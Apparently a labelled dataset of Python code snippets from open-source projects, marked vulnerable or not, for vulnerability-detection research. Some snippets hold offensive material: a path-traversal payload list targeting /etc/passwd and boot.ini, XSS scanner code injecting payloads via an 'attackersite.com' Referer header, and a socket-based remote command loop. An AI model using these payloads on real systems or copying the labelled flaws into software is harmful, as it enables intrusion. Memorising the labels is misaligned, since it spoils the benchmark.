\tssh_user_name=''", "label": 0}, {"snippet_id": 45204, "code": " render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id'", "label": 1}, {"snippet_id": 54853, "code": "=self.get_object().author class CommentDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\" model=Comment def get_success_url(self): return reverse('article-detail', kwargs={'pk': self.object.article.pk}", "label": 0}, {"snippet_id": 27104, "code": " hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with open(fname, \"r\") as f: for line in f: if line.find(\"</form>\") >=0: has_form=0 if len(page) > 0 and len(params) > 0: check_xss(host,", "label": 1}, {"snippet_id": 18326, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^", "label": 1}, {"snippet_id": 41998, "code": " list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype:", "label": 0}, {"snippet_id": 51644, "code": "'HOST': os.environ.get('DB_HOST', 'mysql'), 'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'),{}) } } DATABASE=os.environ.get('DJANGO_DATABASE', 'dev') DATABASES={'default': DATABASES_SETTINGS", "label": 0}, {"snippet_id": 34231, "code": " \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", ", "label": 0}, {"snippet_id": 23558, "code": "<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 18395, "code": "<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>", "label": 0}, {"snippet_id": 27119, "code": ") > 0 and len(params) > 0: check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter", "label": 1}, {"snippet_id": 11452, "code": "-pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ", "label": 0}, {"snippet_id": 28795, "code": "\tssh_key_name=fullpath+'/keys/%s.pem' % sshs[2] \tservers=sql.select_servers(server=serv) \tfor server in servers: \t\tssh_port=server[10] \tssh=SSHClient() \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy", "label": 0}, {"snippet_id": 27486, "code": "('split_br', split_br) add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v) def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name, href)) def make_login_url", "label": 0}, {"snippet_id": 30945, "code": " Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols']) \ttemplate=env.get_template('config_show.html') \t \ttemplate=template.render", "label": 1}, {"snippet_id": 45033, "code": "'oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow", "label": 0}, {"snippet_id": 19138, "code": " is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}", "label": 0}, {"snippet_id": 6719, "code": "\" return self.config.get(self.section, 'password_reset_link') @property def default_language(self): \"\"\" Default language code to use when looking for web pages('en'). \"\"\" return self.config.get(self.section", "label": 0}, {"snippet_id": 18978, "code": "'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$", "label": 0}, {"snippet_id": 6822, "code": " N failures in a given month. This is said to be an imminent Kantara requirement. \"\"\" return self.config.getint(self.section, 'max_authn_failures_per_month') @property def login_state_ttl(self): \"\"\" Lifetime", "label": 0}, {"snippet_id": 52367, "code": "], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows", "label": 0}, {"snippet_id": 29233, "code": "\terror=\"\" \tfull_path=path +file \tif kwargs.get('dir')==\"fullpath\": \t\tfull_path=path \t \ttry: \t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file", "label": 0}, {"snippet_id": 9307, "code": "\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^", "label": 0}, {"snippet_id": 16618, "code": ", url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"", "label": 0}, {"snippet_id": 51015, "code": "'ll move to the horrifically designed absolute nightmare format Crontab. Crontab would be half-great if the parameters where named. Get your crontab guru going, this is the only way you'll understand what", "label": 0}, {"snippet_id": 39720, "code": "\t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)", "label": 0}, {"snippet_id": 11304, "code": ".tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode", "label": 0}, {"snippet_id": 7428, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*", "label": 0}, {"snippet_id": 2935, "code": ".text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G", "label": 0}, {"snippet_id": 27355, "code": " system import environment def add_jinja2_filter(name, fn): _JINJA_ENVIRONMENT.filters[name]=fn class JsonEncoder(json.JSONEncoder): \"\"\"Json encoder.\"\"\" _EPOCH=datetime.datetime.utcfromtimestamp(0) def", "label": 0}, {"snippet_id": 28338, "code": " get_config_var(sec, var): \tfrom configparser import ConfigParser, ExtendedInterpolation \ttry: \t\tpath_config=get_app_dir()+\"/haproxy-wi.cfg\" \t\tconfig=ConfigParser(interpolation=ExtendedInterpolation()) ", "label": 0}, {"snippet_id": 40421, "code": ".get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self", "label": 0}, {"snippet_id": 18094, "code": "?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/", "label": 0}, {"snippet_id": 27744, "code": " response.\"\"\" self._add_security_response_headers() self.response.headers['Content-Type']='application/json' self.before_render_json(values, status) self.response.out.write(json.dumps(values, cls=JsonEncoder)", "label": 0}, {"snippet_id": 29356, "code": "-q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands", "label": 0}, {"snippet_id": 17548, "code": "=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404", "label": 0}, {"snippet_id": 49843, "code": "(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command+\"\\n\") if command==\"exit\": exit() if __name__=='__main__': socketio.run(app,debug=True,host=HOST,port=int(PORT))", "label": 0}, {"snippet_id": 28907, "code": " def get_config(serv, cfg, **kwargs): \timport sql \tconfig_path=\"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t \tssh=ssh_connect(serv) \ttry: \t\tsftp", "label": 0}, {"snippet_id": 48101, "code": " height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height /=diameter width *=IMAGE_SCALE height *=IMAGE_SCALE cropped=original.resize((int(width), int(height", "label": 0}, {"snippet_id": 7735, "code": "/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)", "label": 0}, {"snippet_id": 12246, "code": "<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 29385, "code": "(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept Exception as e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg): \ttry: \t\tconf=open(cfg, \"r\")", "label": 0}, {"snippet_id": 51993, "code": ".lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models", "label": 0}, {"snippet_id": 22893, "code": ".html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses", "label": 1}, {"snippet_id": 2339, "code": " headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param==''", "label": 0}, {"snippet_id": 1227, "code": " method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\": name", "label": 0}, {"snippet_id": 12683, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), )", "label": 0}, {"snippet_id": 44744, "code": "(dict([(_property['name'], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response[", "label": 0}, {"snippet_id": 9215, "code": "/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>", "label": 1}, {"snippet_id": 27089, "code": " %s\\n\" % str(post_params) return return def scan_for_forms(fname, host, url): print \"[+] Start scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try:", "label": 1}, {"snippet_id": 45879, "code": " submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle ", "label": 0}, {"snippet_id": 43332, "code": "\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"", "label": 0}, {"snippet_id": 29206, "code": "\tver=\"\" \tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn ver \t def upload(serv", "label": 0}, {"snippet_id": 45588, "code": ".dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request", "label": 1}, {"snippet_id": 7952, "code": "\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$'", "label": 0}, {"snippet_id": 20155, "code": " bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that", "label": 0}, {"snippet_id": 39342, "code": "\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1])", "label": 0}, {"snippet_id": 34199, "code": "] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr", "label": 0}, {"snippet_id": 29493, "code": "\telse: \t\t\treturn False \tssh.close() \t\t def show_log(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'", "label": 0}, {"snippet_id": 48166, "code": " HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"] text=request.POST[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user, headline", "label": 0}, {"snippet_id": 44322, "code": " api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json", "label": 1}, {"snippet_id": 34953, "code": " not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str", "label": 0}, {"snippet_id": 3973, "code": "\"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body", "label": 0}, {"snippet_id": 10585, "code": " paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils", "label": 0}, {"snippet_id": 28442, "code": "%S\" \t\t \treturn now_utc.strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main', 'log_path') \tlogin='' \t \tif not os.path.exists(log_path):", "label": 0}, {"snippet_id": 18322, "code": ".pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 51610, "code": " os.environ.get('DB_NAME', 'db.sqlite3'), }, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'production':{ 'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, ", "label": 0}, {"snippet_id": 29445, "code": ".append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind) \t\t\t\t \tfirewalld_commands.append('sudo firewall-cmd --reload') \treturn firewalld_commands \t def check_haproxy_config(serv):", "label": 0}, {"snippet_id": 16455, "code": " continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template'", "label": 0}, {"snippet_id": 33223, "code": " can_view=build and user.can_view_build_async(build).get_result() if not can_view: if auth.get_current_identity().is_anonymous: return self.redirect(gae_users.create_login_url(self.request.url)) self.response", "label": 1}, {"snippet_id": 8958, "code": ".COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 32630, "code": "(full_path) elif os.path.exists(full_path): self._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD(self, path): extensions=[ 'markdown.extensions.def_list', 'markdown.extensions.fenced_code', ", "label": 0}, {"snippet_id": 27926, "code": ", self).redirect(str(url), **kwargs) class GcsUploadHandler(Handler): \"\"\"A handler which uploads files to GCS.\"\"\" def __init__(self, request, response): self.initialize(request, response) self.upload=None", "label": 1}, {"snippet_id": 44544, "code": "=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow", "label": 0}, {"snippet_id": 11251, "code": "\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler", "label": 0}, {"snippet_id": 32947, "code": "), d, d)) break self.wfile.write('</div>') self._WriteTemplate('footer.html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path) as f: self.wfile.write(f.read()", "label": 1}, {"snippet_id": 3338, "code": " referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers", "label": 0}, {"snippet_id": 37322, "code": "): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) ", "label": 0}, {"snippet_id": 41047, "code": " get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format", "label": 0}, {"snippet_id": 9586, "code": "<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=", "label": 0}, {"snippet_id": 23903, "code": " name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override:", "label": 1}, {"snippet_id": 26574, "code": "/../etc/passwd%00', '../../../../../../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e", "label": 0}, {"snippet_id": 46325, "code": "\"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"} ], 'is_latest': LATEST.get(), 'engines': get_engines(request", "label": 0}, {"snippet_id": 1455, "code": " import json import sys import hashlib import time sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask", "label": 0}, {"snippet_id": 2368, "code": "'+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to", "label": 0}, {"snippet_id": 6088, "code": ": None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': 'http://localhost:8550/', 'insecure_cookies': '0', } _CONFIG_SECTION='eduid_idp' class", "label": 0}, {"snippet_id": 4124, "code": ",headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result", "label": 0}, {"snippet_id": 40238, "code": " XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types", "label": 0}, {"snippet_id": 28183, "code": " is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open(cfg, \"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError", "label": 0}, {"snippet_id": 36756, "code": "=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list:", "label": 0}, {"snippet_id": 20143, "code": " bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store,", "label": 0}, {"snippet_id": 33121, "code": " import access import api import bq import bulkproc import config import expiration import model import notifications import service import swarming import user README_MD=( 'https://chromium.googlesource", "label": 0}, {"snippet_id": 38986, "code": " convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta", "label": 0}, {"snippet_id": 36116, "code": "\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not", "label": 0}, {"snippet_id": 52470, "code": "(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return", "label": 0}, {"snippet_id": 30462, "code": "\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(local_path_logs, date, date1, rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date", "label": 0}, {"snippet_id": 41934, "code": " \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif", "label": 0}, {"snippet_id": 44136, "code": " query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;& \"\"\".strip() hits=results.hits.hits assert len(hits)=", "label": 1}, {"snippet_id": 2667, "code": " host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value", "label": 0}, {"snippet_id": 38602, "code": " \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta", "label": 0}, {"snippet_id": 20537, "code": " \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against", "label": 0}, {"snippet_id": 37217, "code": " import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict(", "label": 1}, {"snippet_id": 26689, "code": " '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 26123, "code": "] if 'vat_id' in self.fields: del self.fields['vat_id'].widget.attrs['data-display-dependency'] self.fields['name_parts']=NamePartsFormField( max_length=255, required=event.settings.invoice_name_required", "label": 0}, {"snippet_id": 24027, "code": ", shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite", "label": 0}, {"snippet_id": 34502, "code": "\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of ", "label": 0}, {"snippet_id": 53388, "code": "(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission", "label": 1}, {"snippet_id": 23488, "code": ".provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings", "label": 0}, {"snippet_id": 45836, "code": "()[0]) wf_dir=Submission(request.user, workflow, request.fs, request.jt, properties).deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord", "label": 0}, {"snippet_id": 4082, "code": "=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s", "label": 0}, {"snippet_id": 26588, "code": "%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e", "label": 0}, {"snippet_id": 9839, "code": "+=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir", "label": 0}, {"snippet_id": 37929, "code": " \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published", "label": 0}, {"snippet_id": 33598, "code": ".published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext", "label": 0}, {"snippet_id": 7398, "code": "), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^", "label": 0}, {"snippet_id": 18152, "code": "'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 22550, "code": "\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r", "label": 0}, {"snippet_id": 7948, "code": ".list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), 